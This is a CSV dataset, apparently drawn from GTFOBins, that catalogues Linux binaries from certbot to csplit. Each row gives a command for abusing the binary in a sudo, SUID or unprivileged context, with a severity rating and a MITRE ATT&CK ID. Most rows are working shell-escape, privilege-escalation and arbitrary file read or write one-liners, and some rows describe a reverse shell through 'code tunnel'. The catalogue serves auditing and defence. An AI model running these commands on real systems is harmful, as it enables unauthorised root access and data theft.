232,Linux,certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0',"Abuse the 'certbot' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This needs a writable directory, replace `.` if needed.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/certbot/
233,Linux,certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0',"Abuse the 'certbot' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This needs a writable directory, replace `.` if needed.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/certbot/
234,Linux,chattr +i /path/to/input-file,Abuse the 'chattr' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. Make the target file immutable.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/chattr/
235,Linux,chattr +i /path/to/input-file,Abuse the 'chattr' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions. Make the target file immutable.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/chattr/
236,Linux,"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C x",Abuse the 'check_by_ssh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The shell will only last 10 seconds.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/check_by_ssh/
237,Linux,"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C x",Abuse the 'check_by_ssh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The shell will only last 10 seconds.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/check_by_ssh/
238,Linux,check_cups --extra-opts=@/path/to/input-file,Abuse the 'check_cups' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is limited to the first line.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/check_cups/
239,Linux,check_cups --extra-opts=@/path/to/input-file,Abuse the 'check_cups' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is limited to the first line.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/check_cups/
240,Linux,check_log -F /path/to/input-file -O /dev/stdout,Abuse the 'check_log' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/check_log/
241,Linux,check_log -F /path/to/input-file -O /dev/stdout,Abuse the 'check_log' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/check_log/
242,Linux,check_log -F /path/to/input-file -O /path/to/output-file,Abuse the 'check_log' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/check_log/
243,Linux,check_log -F /path/to/input-file -O /path/to/output-file,Abuse the 'check_log' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/check_log/
244,Linux,check_memory --extra-opts=@/path/to/input-file,Abuse the 'check_memory' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is limited to the first line.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/check_memory/
245,Linux,check_memory --extra-opts=@/path/to/input-file,Abuse the 'check_memory' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is limited to the first line.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/check_memory/
246,Linux,check_raid --extra-opts=@/path/to/input-file,Abuse the 'check_raid' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is limited to the first line.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/check_raid/
247,Linux,check_raid --extra-opts=@/path/to/input-file,Abuse the 'check_raid' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is limited to the first line.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/check_raid/
248,Linux,echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file chmod +x /path/to/temp-file check_ssl_cert --grep-bin /path/to/temp-file -H x,Abuse the 'check_ssl_cert' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The shell will be invoked multiple times.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/check_ssl_cert/
249,Linux,echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file chmod +x /path/to/temp-file check_ssl_cert --grep-bin /path/to/temp-file -H x,Abuse the 'check_ssl_cert' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The shell will be invoked multiple times.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/check_ssl_cert/
250,Linux,check_statusfile /path/to/input-file,Abuse the 'check_statusfile' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is limited to the first line.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/check_statusfile/
251,Linux,check_statusfile /path/to/input-file,Abuse the 'check_statusfile' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is limited to the first line.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/check_statusfile/
252,Linux,chmod 6777 /path/to/input-file,"Abuse the 'chmod' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/chmod/
253,Linux,chmod 6777 /path/to/input-file,"Abuse the 'chmod' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions. This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/chmod/
254,Linux,choom -n 0 /bin/sh,Abuse the 'choom' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/choom/
255,Linux,choom -n 0 -- /bin/sh -p,Abuse the 'choom' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/choom/
256,Linux,choom -n 0 /bin/sh,Abuse the 'choom' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/choom/
257,Linux,chown $(id -un):$(id -gn) /path/to/input-file,"Abuse the 'chown' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This can be run with elevated privileges to change ownership and then read, write, or execute a file.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/chown/
258,Linux,chown $(id -un):$(id -gn) /path/to/input-file,"Abuse the 'chown' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions. This can be run with elevated privileges to change ownership and then read, write, or execute a file.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/chown/
259,Linux,chroot /,Abuse the 'chroot' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/chroot/
260,Linux,chroot / /bin/sh -p,Abuse the 'chroot' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/chroot/
261,Linux,chrt 1 /bin/sh,Abuse the 'chrt' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Any number between 1 and 99 will do.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/chrt/
262,Linux,chrt 1 /bin/sh -p,Abuse the 'chrt' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. Any number between 1 and 99 will do.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/chrt/
263,Linux,chrt 1 /bin/sh,Abuse the 'chrt' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. Any number between 1 and 99 will do.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/chrt/
264,Linux,touch x.yara clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p',Abuse the 'clamscan' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/clamscan/
265,Linux,touch x.yara clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p',Abuse the 'clamscan' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/clamscan/
266,Linux,touch x.yara clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p',Abuse the 'clamscan' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/clamscan/
267,Linux,"clisp -x '(ext:run-shell-command ""/bin/sh"")(ext:exit)'",Abuse the 'clisp' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/clisp/
268,Linux,"clisp -x '(ext:run-shell-command ""/bin/sh"")(ext:exit)'",Abuse the 'clisp' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/clisp/
269,Linux,"clisp -x '(ext:run-shell-command ""/bin/sh"")(ext:exit)'",Abuse the 'clisp' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/clisp/
270,Linux,cmake -E cat /path/to/input-file,Abuse the 'cmake' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cmake/
271,Linux,cmake -E cat /path/to/input-file,Abuse the 'cmake' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/cmake/
272,Linux,echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt cmake /path/to/,Abuse the 'cmake' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/cmake/
273,Linux,echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt cmake /path/to/,Abuse the 'cmake' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/cmake/
274,Linux,cmp /path/to/input-file /dev/zero -b -l,Abuse the 'cmp' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Dump the bytes of the input file that are different from the NUL byte in a tabular format.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cmp/
275,Linux,cmp /path/to/input-file /dev/zero -b -l,Abuse the 'cmp' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Dump the bytes of the input file that are different from the NUL byte in a tabular format.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/cmp/
276,Linux,cmp /path/to/input-file /dev/zero -b -l,Abuse the 'cmp' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Dump the bytes of the input file that are different from the NUL byte in a tabular format.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/cmp/
277,Linux,"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' >/path/to/temp-file cobc -xFj --frelax-syntax-checks /path/to/temp-file",Abuse the 'cobc' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The `/path/to/temp-file` sill be overwritten after the execution.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/cobc/
278,Linux,"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' >/path/to/temp-file cobc -xFj --frelax-syntax-checks /path/to/temp-file",Abuse the 'cobc' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. The `/path/to/temp-file` sill be overwritten after the execution.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/cobc/
279,Linux,"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' >/path/to/temp-file cobc -xFj --frelax-syntax-checks /path/to/temp-file",Abuse the 'cobc' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The `/path/to/temp-file` sill be overwritten after the execution.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/cobc/
280,Linux,code tunnel --name xxxxxx,"Abuse the 'code' binary (download) in a sudo context to escalate privileges or execute arbitrary actions. This requires a valid GitHub account. Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/code/
281,Linux,code tunnel --name xxxxxx,"Abuse the 'code' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires a valid GitHub account. Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.",File Download,Low,T1105,https://gtfobins.github.io/gtfobins/code/
282,Linux,code tunnel --name xxxxxx,"Abuse the 'code' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions. This requires a valid GitHub account. Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/code/
283,Linux,code tunnel --name xxxxxx,"Abuse the 'code' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires a valid GitHub account. Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.",Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/code/
284,Linux,code tunnel --name xxxxxx,"Abuse the 'code' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. This requires a valid GitHub account. Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/code/
285,Linux,code tunnel --name xxxxxx,"Abuse the 'code' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires a valid GitHub account. Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.",File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/code/
286,Linux,codex sandbox linux /bin/sh,Abuse the 'codex' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/codex/
287,Linux,codex sandbox linux /bin/sh,Abuse the 'codex' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/codex/
288,Linux,column /path/to/input-file,Abuse the 'column' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This program expects textual data.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/column/
289,Linux,column /path/to/input-file,Abuse the 'column' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This program expects textual data.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/column/
290,Linux,column /path/to/input-file,Abuse the 'column' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This program expects textual data.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/column/
291,Linux,comm /path/to/input-file /dev/null,Abuse the 'comm' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. A newline is appended to the file.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/comm/
292,Linux,comm /path/to/input-file /dev/null,Abuse the 'comm' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. A newline is appended to the file.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/comm/
293,Linux,comm /path/to/input-file /dev/null,Abuse the 'comm' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. A newline is appended to the file.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/comm/
294,Linux,"echo '{""scripts"":{""x"":""/bin/sh""}}' >composer.json composer run-script x",Abuse the 'composer' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/composer/
295,Linux,"echo '{""scripts"":{""x"":""/bin/sh""}}' >composer.json composer run-script x",Abuse the 'composer' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/composer/
296,Linux,cowsay -f /path/to/script.pl x,Abuse the 'cowsay' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cowsay/
297,Linux,cowsay -f /path/to/script.pl x,Abuse the 'cowsay' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/cowsay/
298,Linux,cowthink -f /path/to/script.pl x,Abuse the 'cowthink' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cowthink/
299,Linux,cowthink -f /path/to/script.pl x,Abuse the 'cowthink' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/cowthink/
300,Linux,cp /path/to/input-file /dev/stdout,Abuse the 'cp' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cp/
301,Linux,cp /path/to/input-file /dev/stdout,Abuse the 'cp' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/cp/
302,Linux,cp /path/to/input-file /dev/stdout,Abuse the 'cp' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/cp/
303,Linux,echo DATA | cp /dev/stdin /path/to/output-file,Abuse the 'cp' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/cp/
304,Linux,echo DATA | cp /dev/stdin /path/to/output-file,Abuse the 'cp' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/cp/
305,Linux,echo DATA | cp /dev/stdin /path/to/output-file,Abuse the 'cp' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/cp/
306,Linux,cp /path/to/input-file /path/to/output-file,"Abuse the 'cp' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/cp/
307,Linux,cp /path/to/input-file /path/to/output-file,"Abuse the 'cp' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions. This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/cp/
308,Linux,cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file,"Abuse the 'cp' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This can copy SUID permissions from any SUID binary (e.g., `/path/to/input-file`) to another.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/cp/
309,Linux,cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file,"Abuse the 'cp' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions. This can copy SUID permissions from any SUID binary (e.g., `/path/to/input-file`) to another.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/cp/
310,Linux,cpan ! ...,Abuse the 'cpan' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. Perl code can be executed with the `!` command.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cpan/
311,Linux,cpan ! ...,Abuse the 'cpan' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. Perl code can be executed with the `!` command.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/cpan/
312,Linux,echo /path/to/input-file | cpio -o,"Abuse the 'cpio' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The content of the file is printed to standard output, between the `cpio` archive format header and footer.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cpio/
313,Linux,echo /path/to/input-file | cpio -o,"Abuse the 'cpio' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The content of the file is printed to standard output, between the `cpio` archive format header and footer.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/cpio/
314,Linux,echo /path/to/input-file | cpio -o,"Abuse the 'cpio' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The content of the file is printed to standard output, between the `cpio` archive format header and footer.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/cpio/
315,Linux,echo /path/to/input-file | cpio -R $UID -dp . cat path/to/input-file,"Abuse the 'cpio' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The whole directory structure is copied to `.`, hence this is also a file write.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cpio/
316,Linux,echo /path/to/input-file | cpio -R $UID -dp . cat path/to/input-file,"Abuse the 'cpio' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The whole directory structure is copied to `.`, hence this is also a file write.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/cpio/
317,Linux,echo /path/to/input-file | cpio -dp . cat path/to/input-file,"Abuse the 'cpio' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The whole directory structure is copied to `.`, hence this is also a file write.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/cpio/
318,Linux,echo DATA >/path/to/temp-file echo /path/to/temp-file | cpio -R 0:0 -udp .,"Abuse the 'cpio' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/cpio/
319,Linux,echo DATA >/path/to/temp-file echo /path/to/temp-file | cpio -R 0:0 -udp .,"Abuse the 'cpio' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/cpio/
320,Linux,echo DATA >/path/to/temp-file echo /path/to/temp-file | cpio -udp .,"Abuse the 'cpio' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/cpio/
321,Linux,echo '/bin/sh </dev/tty >/dev/tty' >localhost cpio -o --rsh-command /bin/sh -F localhost:,Abuse the 'cpio' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/cpio/
322,Linux,cpulimit -l 100 -f -- /bin/sh,Abuse the 'cpulimit' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/cpulimit/
323,Linux,cpulimit -l 100 -f -- /bin/sh -p,Abuse the 'cpulimit' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/cpulimit/
324,Linux,cpulimit -l 100 -f -- /bin/sh,Abuse the 'cpulimit' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/cpulimit/
325,Linux,CRASHPAGER=/path/to/command crash -h,Abuse the 'crash' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/crash/
326,Linux,CRASHPAGER=/path/to/command crash -h,Abuse the 'crash' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/crash/
327,Linux,crash -h,Abuse the 'crash' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/crash/
328,Linux,crash -h,Abuse the 'crash' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/crash/
329,Linux,crash -h,Abuse the 'crash' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/crash/
330,Linux,crontab -e,"Abuse the 'crontab' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. This spaws the default editor to edit the crontab file, commands can be scheduled to run using the [cron syntax](https://en.wikipedia.org/wiki/Cron).",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/crontab/
331,Linux,crontab -e,"Abuse the 'crontab' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions. This spaws the default editor to edit the crontab file, commands can be scheduled to run using the [cron syntax](https://en.wikipedia.org/wiki/Cron).",Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/crontab/
332,Linux,crontab -e,Abuse the 'crontab' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/crontab/
333,Linux,crontab -e,Abuse the 'crontab' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/crontab/
334,Linux,csh -c 'echo DATA >/path/to/output-file',Abuse the 'csh' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/csh/
335,Linux,csh -c 'echo DATA >/path/to/output-file' -b,Abuse the 'csh' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/csh/
336,Linux,csh -c 'echo DATA >/path/to/output-file',Abuse the 'csh' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/csh/
337,Linux,csh,Abuse the 'csh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/csh/
338,Linux,csh -b,Abuse the 'csh' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/csh/
339,Linux,csh,Abuse the 'csh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/csh/
340,Linux,csplit /path/to/input-file 1 cat xx01,Abuse the 'csplit' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/csplit/
341,Linux,csplit /path/to/input-file 1 cat xx01,Abuse the 'csplit' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/csplit/
342,Linux,csplit /path/to/input-file 1 cat xx01,Abuse the 'csplit' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/csplit/
343,Linux,echo DATA >/path/to/temp-file csplit -z -b '%doutput-file' /path/to/temp-file 1,"Abuse the 'csplit' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Writes the data to `xx0output-file` in the current working directory. If needed, a different prefix can be specified with `-f` (instead of `xx`).",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/csplit/
344,Linux,echo DATA >/path/to/temp-file csplit -z -b '%doutput-file' /path/to/temp-file 1,"Abuse the 'csplit' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. Writes the data to `xx0output-file` in the current working directory. If needed, a different prefix can be specified with `-f` (instead of `xx`).",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/csplit/
